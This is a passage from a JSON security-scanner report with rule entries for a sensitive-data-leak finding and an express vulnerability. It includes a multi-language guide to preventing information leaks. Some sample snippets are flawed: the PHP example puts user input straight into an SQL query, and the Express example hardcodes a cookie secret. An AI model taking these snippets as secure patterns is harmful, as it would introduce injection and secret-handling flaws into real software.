                                "markdown": "Sensitive data is logged in this flow.\n\n# Sensitive Data Leaks\n\nDisclosing system information helps an adversary learn about your web application and form a plan of attack. You should\ntry to reveal as little about your technology stack and architecture as possible, beyond what is essential for your\nusers to know. Revealing system information makes life easier for an attacker, and gives them a playbook of\nvulnerabilities they can probe for.\n\nHere are some common ways websites leak sensitive data:\n\n* Error conditions that display stack traces or database error messages to the user.\n* Open directory listings that allow exploration of the server's file system.\n* Unsanitized comments in HTML and template files the reveal system details.\n\n::::tabs\n\n:::tab[Java]\n\n## How to Prevent Data Leaks in Java\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment, by specifying an error page in your `web.xml` file:\n\n```xml\n<error-page>\n  <location>/error.html</location>\n</error-page>\n```\n  \nThis error page should only contain a generic error message (e.g. \"An error occurred\"). Stack traces should be written\nto server-side logs.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the\nuser. Here a generic error message is shown to the user, while the detailed error is written to the logs for investigation:\n\n```java\ntry \n{\n    user = getDatabase().findUser(email);\n}\ncatch (SQLException ex) \n{\n    log.error(\"An error occurred looking up the user profiles\", ex):\n    throw new ClientFacingException(\"An unexpected error occurred, please try again later.\");\n}\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. For example, this is how to tell Java to server static Javascript files\nfrom the `/js` directory:\n  \n```xml\n<servlet-mapping>\n    <servlet-name>default</servlet-name>\n    <url-pattern>/js/*.js</url-pattern>\n</servlet-mapping>\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. Here's how to do that in the Jetty web-server:\n  \n```java\nHttpConfiguration.setSendServerVersion(false);\n```\n\n:::\n\n:::tab[C#]\n\n## How to Prevent Data Leaks in C#\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. When you create a new ASP.NET application, the \ntemplate will generate a startup class with some configuration logic:\n\n```csharp\n    public void Configure(IApplicationBuilder app, IWebHostEnvironment env)\n    {\n        if (env.IsDevelopment())\n        {\n            app.UseDeveloperExceptionPage();\n        }\n        else\n        {\n            app.UseExceptionHandler(\"/Home/Error\");\n        }\n    }\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. When running in non-development mode the ASP.NET web-server will show a generic error message to the user, while \nthe detailed error is written to the logs for investigation. You can configure the error page that is generated at\n`/Views/Shared/Errors.cs.html`.\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. An ASP.NET web application can be configured to serve static content under\nthe `wwwroot` directory by adding the following line in the startup configuration:\n\n```csharp\napp.UseStaticFiles();\n```\n\nYou can also add additional static content directories with the following logic:\n\n```csharp\napp.UseStaticFiles(new StaticFileOptions\n{\n    FileProvider = new PhysicalFileProvider(Path.Combine(env.ContentRootPath, \"MyStaticFiles\")),\n    RequestPath = \"/StaticFiles\"\n});\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. In ASP.NET, you can programmatically remove it in the following manner:\n\n```csharp\nHttpContext.Current.Response.Headers.Remove(\"Server\");\n```\n\nIf you are deploying to IIS, you can remove the header in your configuration settings:\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<configuration>\n    <system.webServer>\n        <security>\n            <requestFiltering removeServerHeader=\"true\" />\n        </security>\n    </system.webServer>\n</configuration>\n```\n\n:::\n\n:::tab[JavaScript]\n\n## How to Prevent Data Leaks in JavaScript\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. This Express server will dump stack trace \ninformation only in the `development` environment, and disable it in `production`:\n  \n```javascript\nconst errorhandler = require('errorhandler')\nconst express      = require('express')\n\nconst app = express()\n\napp.use(errorhandler({\n  dumpExceptions : app.get('env') === 'development',\n  showStack      : app.get('env') === 'development'\n}))\n```\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database are logged, but not shown to the user. Here a generic error \nmessage is shown to the user, while the detailed error is written to the logs for investigation:\n\n```javascript\napp.get('/profile', (request, response) => {\n  db.run('SELECT * FROM USERS WHERE email = ?', [ request.session.user ], (error, user) => {\n    if (error) {\n      log.error(error)\n      response.send('An unexpected error occurred')\n      return\n    }\n\n    response.send(`<p>Your email is ${user.email}</p>`)\n  })\n})\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. For example, this is how to tell Expression to server static content (like \nclient-side JavaScript and CSS files) from the `/static` directory:\n  \n```javascript\napp.use(express.static(__dirname + '/static'))\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. Here's how to do that in Express:\n  \n```javascript\n// Disable the 'X-Powered-By' header.\napp.disable('x-powered-by')\n\nconst cookieParser = require('cookie-parser')\nconst session      = require('express-session')\n\napp.use(cookieParser('secret'))\napp.use(session({\n  cookie : {\n    maxAge   : 60000,\n    httpOnly : true,\n    sameSite : 'strict',\n    secure   : app.get('env') !== 'development'\n  },\n\n  // Make the session cookie name generic.\n  name   : 'session',\n  secret : process.env.SESSION_SECRET || uid.sync(18)\n}))\n```\n\n:::\n\n:::tab[Python]\n\n## How to Prevent Data Leaks in Python\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. Observe how the Flask framework uses different error\npages in development and production modes, distinguished by whether the environment variable `FLASK_ENV` is set to\n`development`:\n\n```python\n  @property\n  def debug(self) -> bool:\n     \"\"\"Whether debug mode is enabled. When using ``flask run`` to start\n     the development server, an interactive debugger will be shown for\n     unhandled exceptions, and the server will be reloaded when code\n     changes. This maps to the :data:`DEBUG` config key. This is\n     enabled when :attr:`env` is ``'development'`` and is overridden\n     by the ``FLASK_DEBUG`` environment variable. It may not behave as\n     expected if set in code.\n\n     **Do not enable debug mode when deploying in production.**\"\"\"\n     return self.config[\"DEBUG\"]\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces, and even allow interactive execution of Python code.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. When running in non-development mode the Flask web-server will show a generic error message to the user, while \nthe detailed error is written to the logs for investigation:\n\n```python\n  def log_exception(self, exc_info) -> None:\n    \"\"\"Logs an exception.  This is called by :meth:`handle_exception`\n    if debugging is disabled and right before the handler is called.\n    The default implementation logs the exception as error on the\n    :attr:`logger`.\n    \"\"\"\n    self.logger.error(\n        f\"Exception on {request.path} [{request.method}]\", exc_info=exc_info\n    )\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. Here's how to specify the directory containing static files (like JavaScript \ncode and images) in the Flask web-server:\n\n```python\nfrom flask import Flask\n\napp = Flask(__name__, static_folder='static')\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. In the Gunicorn WSGI container, you can configure this header in your `gunicorn.conf.py` config \nfile:\n\n```python\nimport gunicorn\n\n# Make the server name completely generic.\ngunicorn.SERVER_SOFTWARE = 'Server'\n```\n\n:::\n\n:::tab[Scala]\n\n## How to Prevent Data Leaks in Scala\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. Notice how the Play framework uses different error\npages in development and production modes:\n\n```scala\n  /**\n   * Invoked in dev mode when a server error occurs.\n   */\n  protected def onDevServerError(request: RequestHeader, exception: UsefulException): Future[Result] = {\n    Future.successful {\n      implicit val ir: RequestHeader = request\n      InternalServerError(views.html.defaultpages.devError(playEditor, exception))\n    }\n  }\n\n  /**\n   * Invoked in prod mode when a server error occurs.\n   */\n  protected def onProdServerError(request: RequestHeader, exception: UsefulException): Future[Result] =\n    Future.successful {\n      implicit val ir: RequestHeader = request\n      InternalServerError(views.html.defaultpages.error(exception))\n    }\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. Here a generic error message is shown to the user, while the detailed error is written to the logs for investigation:\n\n```scala\n  override def onServerError(request: RequestHeader, exception: Throwable): Future[Result] = {\n    try {\n      val usefulException = HttpErrorHandlerExceptions.throwableToUsefulException(sourceMapper, !config.showDevErrors, exception)\n\n      // Write the full error context and stack trace to the log file.\n      logServerError(request, usefulException)\n\n      // Sanitize the error to be displayed to the user, when in production-mode.\n      if (config.showDevErrors) onDevServerError(request, usefulException)\n      else onProdServerError(request, usefulException)\n    } catch {\n      case NonFatal(e) =>\n        logger.error(\"Error while handling error\", e)\n        Future.successful(InternalServerError(fatalErrorMessage(request, e)))\n    }\n  }\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. In the Play framework, static assets like JavaScript and CSS files are \ntypically kept in a separate `/public` and mapped in the routes file as follows:\n\n```scala\nGET  /assets/*file        controllers.Assets.at(path=\"/public\", file)\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. For example, the Akka web-server allows you to disable these headers through configuration options:\n\n```\nakka.http {\n  server {\n    # The default value of the `Server` header to produce if no\n    # explicit `Server`-header was included in a response.\n    # If this value is the empty string and no header was included in\n    # the request, no `Server` header will be rendered at all.\n    server-header = \"\" # akka-http/${akka.http.version}\n  }  \n}\n```\n\n:::\n\n:::tab[Go]\n\n## How to Prevent Data Leaks in Go\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. In Go web applications, you typically end up writing\nyour own error pages. Ensure that any pages that handle errors pay use flags to distinguish the environment they are \nexecuting in:\n\n```go\nimport \"flag\"\n\nvar debug = flag.Bool(\"debug\", false, \"Whether to show full error messages on the client\")\n```\n\nA default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page can show more information, like full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. Go functions typically return error codes when then fail, and web handlers will return early when error conditions \noccur. Ensure such code does not leak sensitive system data.\n\n```go\nsession, err := session.Get(request, \"session\")\n\nif err != nil {\n  // The second argument here is returned directly to the client, which leaks information!\n  http.Error(response, err.Error(), http.StatusInternalServerError)\n  return\n}\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. Here's how to specify the directory containing static files (like JavaScript \ncode and images) in the Gorilla web framework:\n\n```go\nfunc main() {\n  var dir string\n\n  flag.StringVar(&dir, \"dir\", \".\", \"the directory to serve files from. Defaults to the current dir\")\n  flag.Parse()\n  router := mux.NewRouter()\n\n  // This will serve files under http://localhost:8000/static/<filename>\n  router.PathPrefix(\"/static/\").Handler(http.StripPrefix(\"/static/\", http.FileServer(http.Dir(dir))))\n\n  server := &http.Server{\n    Handler: router,\n    Addr:    \"127.0.0.1:8000\"\n  }\n\n  log.Fatal(server.ListenAndServe())\n}\n```\n\n:::\n\n:::tab[PHP]\n\n## How to Prevent Data Leaks in PHP\n\n### Keep Error Reporting on the Server\n\nDisable error reporting to the client in your production environment by setting the `display_errors` directive to `Off` in your `php.ini`:\n\n```ini\ndisplay_errors = Off\n```\n\nYou should instead log the errors for review. Ensure that `log_errors` directive is set to `On`:\n\n```ini\nlog_errors = On\nerror_log = /path/to/php-error.log\n```\n\n### Sanitize Error Messages\n\nAvoid directly echoing out database or system error messages to the user. Instead, present a generic message while logging the exact error for debugging:\n\n```php\ntry \n{\n    $result = $db->query(\"SELECT * FROM users WHERE email = '$email'\");\n}\ncatch (PDOException $e) \n{\n    error_log(\"Database error: \" . $e->getMessage());\n    echo \"An unexpected error occurred, please try again later.\";\n}\n```\n\n### Separate Dynamic and Static Resources\n\nFor websites or web applications using PHP, it's common to store PHP files in one directory and static resources (e.g., images, stylesheets, and JavaScript files) in separate directories. This way, you can use server configurations to ensure direct access to PHP files is restricted.\n\n### Hide PHP Version Information\n\nThe `X-Powered-By` header can give away the PHP version you're running. To hide this:\n\n1. Edit `php.ini` and update:\n\n```ini\nexpose_php = Off\n```\n\nOr, if you're using an `.htaccess` file on an Apache server:\n\n```apache\nHeader unset X-Powered-By\n```\n\n### Be Careful With Comments\n\nAvoid leaving sensitive or internal-only comments in your PHP files. Even if you think they are in a part of the code that doesn't output to the user, mistakes or changes in the codebase could expose them. Always assume that anything in a code file could potentially be exposed.\n\n:::\n\n::::\n\n## Further Considerations\n\n* Ensure any comments in template files don't contain sensitive data! It's easy to leave in notes about server names\n  and addresses that will get passed to the client-side. Attackers know this, and will scan comments in HTML for IP\n  addresses and URLs.\n  \n* Ensure server-side log messages do not contain sensitive information like passwords or credit card numbers - this \n  should mitigate the harm an attacker can do if they manage to steal your server's log files.\n  \n\n## Additional information\n\n**[CWE-200](https://cwe.mitre.org/data/definitions/200.html)**\n\n**[OWASP-A3](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure)**",
                                "text": "Sensitive data is logged in this flow.\n\n# Sensitive Data Leaks\n\nDisclosing system information helps an adversary learn about your web application and form a plan of attack. You should\ntry to reveal as little about your technology stack and architecture as possible, beyond what is essential for your\nusers to know. Revealing system information makes life easier for an attacker, and gives them a playbook of\nvulnerabilities they can probe for.\n\nHere are some common ways websites leak sensitive data:\n\n* Error conditions that display stack traces or database error messages to the user.\n* Open directory listings that allow exploration of the server's file system.\n* Unsanitized comments in HTML and template files the reveal system details.\n\n::::tabs\n\n:::tab[Java]\n\n## How to Prevent Data Leaks in Java\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment, by specifying an error page in your `web.xml` file:\n\n```xml\n<error-page>\n  <location>/error.html</location>\n</error-page>\n```\n  \nThis error page should only contain a generic error message (e.g. \"An error occurred\"). Stack traces should be written\nto server-side logs.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the\nuser. Here a generic error message is shown to the user, while the detailed error is written to the logs for investigation:\n\n```java\ntry \n{\n    user = getDatabase().findUser(email);\n}\ncatch (SQLException ex) \n{\n    log.error(\"An error occurred looking up the user profiles\", ex):\n    throw new ClientFacingException(\"An unexpected error occurred, please try again later.\");\n}\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. For example, this is how to tell Java to server static Javascript files\nfrom the `/js` directory:\n  \n```xml\n<servlet-mapping>\n    <servlet-name>default</servlet-name>\n    <url-pattern>/js/*.js</url-pattern>\n</servlet-mapping>\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. Here's how to do that in the Jetty web-server:\n  \n```java\nHttpConfiguration.setSendServerVersion(false);\n```\n\n:::\n\n:::tab[C#]\n\n## How to Prevent Data Leaks in C#\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. When you create a new ASP.NET application, the \ntemplate will generate a startup class with some configuration logic:\n\n```csharp\n    public void Configure(IApplicationBuilder app, IWebHostEnvironment env)\n    {\n        if (env.IsDevelopment())\n        {\n            app.UseDeveloperExceptionPage();\n        }\n        else\n        {\n            app.UseExceptionHandler(\"/Home/Error\");\n        }\n    }\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. When running in non-development mode the ASP.NET web-server will show a generic error message to the user, while \nthe detailed error is written to the logs for investigation. You can configure the error page that is generated at\n`/Views/Shared/Errors.cs.html`.\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. An ASP.NET web application can be configured to serve static content under\nthe `wwwroot` directory by adding the following line in the startup configuration:\n\n```csharp\napp.UseStaticFiles();\n```\n\nYou can also add additional static content directories with the following logic:\n\n```csharp\napp.UseStaticFiles(new StaticFileOptions\n{\n    FileProvider = new PhysicalFileProvider(Path.Combine(env.ContentRootPath, \"MyStaticFiles\")),\n    RequestPath = \"/StaticFiles\"\n});\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. In ASP.NET, you can programmatically remove it in the following manner:\n\n```csharp\nHttpContext.Current.Response.Headers.Remove(\"Server\");\n```\n\nIf you are deploying to IIS, you can remove the header in your configuration settings:\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<configuration>\n    <system.webServer>\n        <security>\n            <requestFiltering removeServerHeader=\"true\" />\n        </security>\n    </system.webServer>\n</configuration>\n```\n\n:::\n\n:::tab[JavaScript]\n\n## How to Prevent Data Leaks in JavaScript\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. This Express server will dump stack trace \ninformation only in the `development` environment, and disable it in `production`:\n  \n```javascript\nconst errorhandler = require('errorhandler')\nconst express      = require('express')\n\nconst app = express()\n\napp.use(errorhandler({\n  dumpExceptions : app.get('env') === 'development',\n  showStack      : app.get('env') === 'development'\n}))\n```\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database are logged, but not shown to the user. Here a generic error \nmessage is shown to the user, while the detailed error is written to the logs for investigation:\n\n```javascript\napp.get('/profile', (request, response) => {\n  db.run('SELECT * FROM USERS WHERE email = ?', [ request.session.user ], (error, user) => {\n    if (error) {\n      log.error(error)\n      response.send('An unexpected error occurred')\n      return\n    }\n\n    response.send(`<p>Your email is ${user.email}</p>`)\n  })\n})\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. For example, this is how to tell Expression to server static content (like \nclient-side JavaScript and CSS files) from the `/static` directory:\n  \n```javascript\napp.use(express.static(__dirname + '/static'))\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. Here's how to do that in Express:\n  \n```javascript\n// Disable the 'X-Powered-By' header.\napp.disable('x-powered-by')\n\nconst cookieParser = require('cookie-parser')\nconst session      = require('express-session')\n\napp.use(cookieParser('secret'))\napp.use(session({\n  cookie : {\n    maxAge   : 60000,\n    httpOnly : true,\n    sameSite : 'strict',\n    secure   : app.get('env') !== 'development'\n  },\n\n  // Make the session cookie name generic.\n  name   : 'session',\n  secret : process.env.SESSION_SECRET || uid.sync(18)\n}))\n```\n\n:::\n\n:::tab[Python]\n\n## How to Prevent Data Leaks in Python\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. Observe how the Flask framework uses different error\npages in development and production modes, distinguished by whether the environment variable `FLASK_ENV` is set to\n`development`:\n\n```python\n  @property\n  def debug(self) -> bool:\n     \"\"\"Whether debug mode is enabled. When using ``flask run`` to start\n     the development server, an interactive debugger will be shown for\n     unhandled exceptions, and the server will be reloaded when code\n     changes. This maps to the :data:`DEBUG` config key. This is\n     enabled when :attr:`env` is ``'development'`` and is overridden\n     by the ``FLASK_DEBUG`` environment variable. It may not behave as\n     expected if set in code.\n\n     **Do not enable debug mode when deploying in production.**\"\"\"\n     return self.config[\"DEBUG\"]\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces, and even allow interactive execution of Python code.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. When running in non-development mode the Flask web-server will show a generic error message to the user, while \nthe detailed error is written to the logs for investigation:\n\n```python\n  def log_exception(self, exc_info) -> None:\n    \"\"\"Logs an exception.  This is called by :meth:`handle_exception`\n    if debugging is disabled and right before the handler is called.\n    The default implementation logs the exception as error on the\n    :attr:`logger`.\n    \"\"\"\n    self.logger.error(\n        f\"Exception on {request.path} [{request.method}]\", exc_info=exc_info\n    )\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. Here's how to specify the directory containing static files (like JavaScript \ncode and images) in the Flask web-server:\n\n```python\nfrom flask import Flask\n\napp = Flask(__name__, static_folder='static')\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. In the Gunicorn WSGI container, you can configure this header in your `gunicorn.conf.py` config \nfile:\n\n```python\nimport gunicorn\n\n# Make the server name completely generic.\ngunicorn.SERVER_SOFTWARE = 'Server'\n```\n\n:::\n\n:::tab[Scala]\n\n## How to Prevent Data Leaks in Scala\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. Notice how the Play framework uses different error\npages in development and production modes:\n\n```scala\n  /**\n   * Invoked in dev mode when a server error occurs.\n   */\n  protected def onDevServerError(request: RequestHeader, exception: UsefulException): Future[Result] = {\n    Future.successful {\n      implicit val ir: RequestHeader = request\n      InternalServerError(views.html.defaultpages.devError(playEditor, exception))\n    }\n  }\n\n  /**\n   * Invoked in prod mode when a server error occurs.\n   */\n  protected def onProdServerError(request: RequestHeader, exception: UsefulException): Future[Result] =\n    Future.successful {\n      implicit val ir: RequestHeader = request\n      InternalServerError(views.html.defaultpages.error(exception))\n    }\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. Here a generic error message is shown to the user, while the detailed error is written to the logs for investigation:\n\n```scala\n  override def onServerError(request: RequestHeader, exception: Throwable): Future[Result] = {\n    try {\n      val usefulException = HttpErrorHandlerExceptions.throwableToUsefulException(sourceMapper, !config.showDevErrors, exception)\n\n      // Write the full error context and stack trace to the log file.\n      logServerError(request, usefulException)\n\n      // Sanitize the error to be displayed to the user, when in production-mode.\n      if (config.showDevErrors) onDevServerError(request, usefulException)\n      else onProdServerError(request, usefulException)\n    } catch {\n      case NonFatal(e) =>\n        logger.error(\"Error while handling error\", e)\n        Future.successful(InternalServerError(fatalErrorMessage(request, e)))\n    }\n  }\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. In the Play framework, static assets like JavaScript and CSS files are \ntypically kept in a separate `/public` and mapped in the routes file as follows:\n\n```scala\nGET  /assets/*file        controllers.Assets.at(path=\"/public\", file)\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. For example, the Akka web-server allows you to disable these headers through configuration options:\n\n```\nakka.http {\n  server {\n    # The default value of the `Server` header to produce if no\n    # explicit `Server`-header was included in a response.\n    # If this value is the empty string and no header was included in\n    # the request, no `Server` header will be rendered at all.\n    server-header = \"\" # akka-http/${akka.http.version}\n  }  \n}\n```\n\n:::\n\n:::tab[Go]\n\n## How to Prevent Data Leaks in Go\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. In Go web applications, you typically end up writing\nyour own error pages. Ensure that any pages that handle errors pay use flags to distinguish the environment they are \nexecuting in:\n\n```go\nimport \"flag\"\n\nvar debug = flag.Bool(\"debug\", false, \"Whether to show full error messages on the client\")\n```\n\nA default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page can show more information, like full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. Go functions typically return error codes when then fail, and web handlers will return early when error conditions \noccur. Ensure such code does not leak sensitive system data.\n\n```go\nsession, err := session.Get(request, \"session\")\n\nif err != nil {\n  // The second argument here is returned directly to the client, which leaks information!\n  http.Error(response, err.Error(), http.StatusInternalServerError)\n  return\n}\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. Here's how to specify the directory containing static files (like JavaScript \ncode and images) in the Gorilla web framework:\n\n```go\nfunc main() {\n  var dir string\n\n  flag.StringVar(&dir, \"dir\", \".\", \"the directory to serve files from. Defaults to the current dir\")\n  flag.Parse()\n  router := mux.NewRouter()\n\n  // This will serve files under http://localhost:8000/static/<filename>\n  router.PathPrefix(\"/static/\").Handler(http.StripPrefix(\"/static/\", http.FileServer(http.Dir(dir))))\n\n  server := &http.Server{\n    Handler: router,\n    Addr:    \"127.0.0.1:8000\"\n  }\n\n  log.Fatal(server.ListenAndServe())\n}\n```\n\n:::\n\n:::tab[PHP]\n\n## How to Prevent Data Leaks in PHP\n\n### Keep Error Reporting on the Server\n\nDisable error reporting to the client in your production environment by setting the `display_errors` directive to `Off` in your `php.ini`:\n\n```ini\ndisplay_errors = Off\n```\n\nYou should instead log the errors for review. Ensure that `log_errors` directive is set to `On`:\n\n```ini\nlog_errors = On\nerror_log = /path/to/php-error.log\n```\n\n### Sanitize Error Messages\n\nAvoid directly echoing out database or system error messages to the user. Instead, present a generic message while logging the exact error for debugging:\n\n```php\ntry \n{\n    $result = $db->query(\"SELECT * FROM users WHERE email = '$email'\");\n}\ncatch (PDOException $e) \n{\n    error_log(\"Database error: \" . $e->getMessage());\n    echo \"An unexpected error occurred, please try again later.\";\n}\n```\n\n### Separate Dynamic and Static Resources\n\nFor websites or web applications using PHP, it's common to store PHP files in one directory and static resources (e.g., images, stylesheets, and JavaScript files) in separate directories. This way, you can use server configurations to ensure direct access to PHP files is restricted.\n\n### Hide PHP Version Information\n\nThe `X-Powered-By` header can give away the PHP version you're running. To hide this:\n\n1. Edit `php.ini` and update:\n\n```ini\nexpose_php = Off\n```\n\nOr, if you're using an `.htaccess` file on an Apache server:\n\n```apache\nHeader unset X-Powered-By\n```\n\n### Be Careful With Comments\n\nAvoid leaving sensitive or internal-only comments in your PHP files. Even if you think they are in a part of the code that doesn't output to the user, mistakes or changes in the codebase could expose them. Always assume that anything in a code file could potentially be exposed.\n\n:::\n\n::::\n\n## Further Considerations\n\n* Ensure any comments in template files don't contain sensitive data! It's easy to leave in notes about server names\n  and addresses that will get passed to the client-side. Attackers know this, and will scan comments in HTML for IP\n  addresses and URLs.\n  \n* Ensure server-side log messages do not contain sensitive information like passwords or credit card numbers - this \n  should mitigate the harm an attacker can do if they manage to steal your server's log files.\n  \n\n## Additional information\n\n**[CWE-200](https://cwe.mitre.org/data/definitions/200.html)**\n\n**[OWASP-A3](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure)**"
                            },
                            "helpUri": "https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure",
                            "id": "sensitive-to-log/4edeaecd19b62a73663b81f4faf9302d",
                            "name": "Sensitive Data Leak: Sensitive Data Is Leaked To Log In Login.js:handlelogin",
                            "properties": {
                                "precision": "very-high",
                                "security-severity": "8",
                                "tags": [
                                    "ng-sast",
                                    "CVSS 8",
                                    "CWE 117",
                                    "CWE 200",
                                    "OWASP 2021 a01-broken-access-control",
                                    "OWASP a01-2021-broken-access-control",
                                    "OWASP a3-sensitive-data-exposure",
                                    "Sensitive Data Leak"
                                ]
                            },
                            "shortDescription": {
                                "text": "Sensitive Data Leak: Sensitive Data is Leaked to Log in Login.js:handleLogin"
                            }
                        },
                        {
                            "defaultConfiguration": {
                                "enabled": true,
                                "level": "warning",
                                "rank": -1
                            },
                            "fullDescription": {
                                "text": "In express <4.20.0, passing untrusted user input - even after sanitizing it - to `response.redirect()` may execute untrusted code."
                            },
                            "help": {
                                "markdown": "In express <4.20.0, passing untrusted user input - even after sanitizing it - to `response.redirect()` may execute untrusted code",
                                "text": "In express <4.20.0, passing untrusted user input - even after sanitizing it - to `response.redirect()` may execute untrusted code"
                            },
                            "helpUri": "https://cwe.mitre.org/data/definitions/79.html",
                            "id": "oss_vuln/9c78c614b83c0a23816c5ed4b5ae8592",
                            "name": "Pkg:npm/Express@4.17.1",
                            "properties": {
                                "precision": "very-high",
                                "security-severity": "4.7",
                                "tags": [
                                    "ng-sast",
                                    "CVE-2024-43796",
                                    "CVSS 4.7",
                                    "CWE 1035",
                                    "CWE 79",
                                    "CWE 937",
                                    "No exploits",
                                    "Reachable"
                                ]
                            },
                            "shortDescription": {
                                "text": "pkg:npm/express@4.17.1"
                            }
                        },
                        {
                            "defaultConfiguration": {
                                "enabled": true,
                                "level": "warning",
                                "rank": -1
                            },
                            "fullDescription": {
                                "text": "Sensitive data is logged in this flow."
                            },
